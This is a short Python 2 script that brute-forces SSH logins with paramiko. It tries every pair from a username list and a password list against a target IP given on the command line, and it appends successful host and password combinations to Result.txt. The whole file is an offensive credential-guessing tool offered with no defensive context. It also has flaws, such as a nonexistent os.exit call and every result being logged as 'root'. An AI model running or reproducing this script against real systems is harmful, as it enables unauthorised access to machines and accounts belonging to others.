import threading
import Queue
import paramiko
import os
import sys

q = Queue.Queue()

def run(host, user, passwd):
    try:
        client = paramiko.SSHClient()
        client.load_system_host_keys()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(host, 22, user, passwd, pkey=None,timeout=None,allow_agent=False,look_for_keys=False )
        client.close()
        print ('[+] Try %s passwd %s  success' %(host,passwd))
        f = open('Result.txt','a')
        f.write(host + '' + 'root' + '' + passwd + '\n')
        f.flush()
        f.close()

    except Exception,e:
        print e
        print ('[-] Try %s passwd %s failed' % (host,passwd))
        client.close()
    if(passwd == 'ERROR'):
        os.exit(0)


def worker(ip):
    while True:
        li = q.get()
        # print li[0]
        run(ip, li[0], li[1])
        q.task_done()

def main():
    ip = sys.argv[3]
    users = sys.argv[1]
    passwd = sys.argv[2]
    ssh_passwd = []
    ssh_users = []
    fusers = open(users)
    for i in fusers.readlines():
        user = i.strip('\n')
        ssh_users.append(user)
    fpass = open(passwd)
    for line in fpass.readlines():
        passwd = line.strip('\n')
        ssh_passwd.append(passwd)
    fpass.close()
    threads = 1
    for i in range(threads):
        t = threading.Thread(target=worker, args=(ip, ))
        t.setDaemon(True)
        t.start()
    for user in ssh_users:
        for passwd in ssh_passwd:
            q.put((user, passwd))

    q.join()
    print 'exit!!!'

if __name__ == '__main__':
    main()